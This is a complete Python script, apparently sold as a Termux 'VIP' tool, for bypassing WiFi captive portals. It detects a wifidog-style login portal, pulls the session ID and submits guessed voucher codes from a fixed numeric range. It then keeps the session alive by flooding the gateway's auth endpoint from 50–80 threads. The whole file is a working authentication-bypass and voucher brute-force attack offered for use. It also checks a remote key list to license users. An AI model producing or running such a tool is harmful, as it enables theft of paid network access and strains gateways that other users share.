import requests, re, urllib3, time, threading, os, random, subprocess, json, sys, socket
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

# Disable insecure request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration - Updated to your repository
VIP_URL = "https://raw.githubusercontent.com/ShineLiveTV/my-keys-main/main/Koclay.txt"
USER_NAME, EXP_DATE, AUTHORIZED = "Me", "--", False
VOUCHER_LIST = [str(i) for i in range(123400, 123501)]

AI_STATUS = "Discovery"
LAST_PING = 0
STOP_THREADS = threading.Event()

def get_advanced_headers():
    browsers = [
        f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        f"Mozilla/5.0 (Linux; Android {random.randint(11,14)}; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
    ]
    return {
        "User-Agent": random.choice(browsers),
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

def update_status():
    global USER_NAME, EXP_DATE, AUTHORIZED
    try:
        # Get Termux/Linux user ID
        uid = subprocess.check_output(['whoami']).decode('utf-8').strip()
        res = requests.get(f"{VIP_URL}?cb={random.random()}", timeout=7)
        if res.status_code == 200:
            for line in res.text.splitlines():
                if uid in line:
                    parts = line.split('|')
                    v_name, exp_dt = parts[1].strip(), parts[2].strip()
                    USER_NAME, EXP_DATE, AUTHORIZED = v_name, exp_dt, True
                    return
    except:
        pass

def banner():
    os.system('clear')
    print("\033[93m" + "="*38)
    print("\033[43m  \033[42m  \033[41m  \033[0m \033[96m" + " KoCLay MASTER ULTIMATE V3.5 " + "\033[41m  \033[42m  \033[43m  \033[0m")
    print("\033[96m" + r'''
    █▄  █▄  ██████  ███████  █▄      █████  █▄   █▄
    ██  █  █  █      █      █  █     █  █  █  █  █  
    █████  █   ███   ███     █     ███████  █████  
    █  ██  █   █      █      █     █  █  █  █  █  
    █  █  █  ██████  ██████  █▄  █  █  █  █  
    ''')
    print(f"\033[95m 👑 MASTER: {USER_NAME} | \033[92m📅 EXP: {EXP_DATE}")
    print("\033[93m" + "="*38 + "\033[0m")

def show_ping_live():
    while True:
        if LAST_PING > 0:
            p_color = "\033[92m" if LAST_PING < 110 else "\033[93m" if LAST_PING < 250 else "\033[91m"
            sys.stdout.write(f"\r \033[96m[~] AI: {AI_STATUS} | {p_color}⚡ PING: {LAST_PING}ms          \033[0m")
            sys.stdout.flush()
        time.sleep(0.5)

def turbo_pulse(link, mode):
    global LAST_PING, AI_STATUS
    payload = "koclay" * 5
    while not STOP_THREADS.is_set():
        try:
            start = time.time()
            requests.get(link, timeout=5, verify=False, headers=get_advanced_headers(), params={'data': payload})
            LAST_PING = int((time.time() - start) * 1000)
            AI_STATUS = "Stable" if LAST_PING < 250 else "Rescue"
            time.sleep(0.1)
        except:
            AI_STATUS = "Rescue"; time.sleep(0.5)

def launch():
    global AI_STATUS, STOP_THREADS
    update_status()
    banner()
    
    print("\033[92m [1] 🧠 Balanced Mode (穩定) \033[0m")
    print("\033[91m [2] 🔥 Turbo Mode (加速) \033[0m")
    choice = input("\033[97m\n [?] Select Power: ")
    threads = 80 if choice == "2" else 50

    threading.Thread(target=show_ping_live, daemon=True).start()

    session = requests.Session()
    print(f"\n\033[93m[*] Starting engine with {threads} threads...\033[0m")
    
    while True:
        try:
            STOP_THREADS.clear()
            # Check for captive portal
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=8)
            p_url = r.url
            parsed = urlparse(p_url)
            
            # If redirected, we found a login page
            if "generate_204" not in p_url:
                print(f"\033[96m[*] Found portal: {parsed.netloc}\033[0m")
                
                gw = parse_qs(parsed.query).get('gw_address', [parsed.netloc.split(':')[0]])[0]
                if not gw: gw = socket.gethostbyname(parsed.netloc)
                
                r1 = session.get(p_url, verify=False, timeout=8, headers=get_advanced_headers())
                m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
                n_url = urljoin(p_url, m.group(1)) if m else p_url
                
                r2 = session.get(n_url, verify=False, timeout=8, headers=get_advanced_headers())
                sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
                
                if sid:
                    v_code = random.choice(VOUCHER_LIST)
                    time.sleep(1) 
                    session.post(f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/", 
                                json={'accessCode': v_code, 'sessionId': sid, 'apiVersion': 1}, 
                                timeout=5, headers=get_advanced_headers())
                    
                    auth_link = f"http://{gw}:2060/wifidog/auth?token={sid}"
                    print(f"\n\033[92m[*] ⚡ BYPASS SUCCESS! ⚡\033[0m")
                    
                    for _ in range(threads):
                        threading.Thread(target=turbo_pulse, args=(auth_link, choice), daemon=True).start()
                    
                    while True:
                        time.sleep(0.5)
                        try:
                            c = requests.get("http://www.google.com/generate_204", timeout=5)
                            if c.status_code != 204: raise Exception("Off")
                        except:
                            AI_STATUS = "Rescue"; break
                    STOP_THREADS.set()
                else:
                    AI_STATUS = "Discovery"; time.sleep(2)
            else:
                # No redirect, already have internet
                AI_STATUS = "Online"; 
                sys.stdout.write(f"\r \033[92m[*] You are already connected to the internet. Monitoring...\033[0m")
                sys.stdout.flush()
                time.sleep(5)
                
        except Exception as e:
            AI_STATUS = "Rescue"; time.sleep(2)

if __name__ == "__main__":
    try: launch()
    except KeyboardInterrupt: sys.exit()
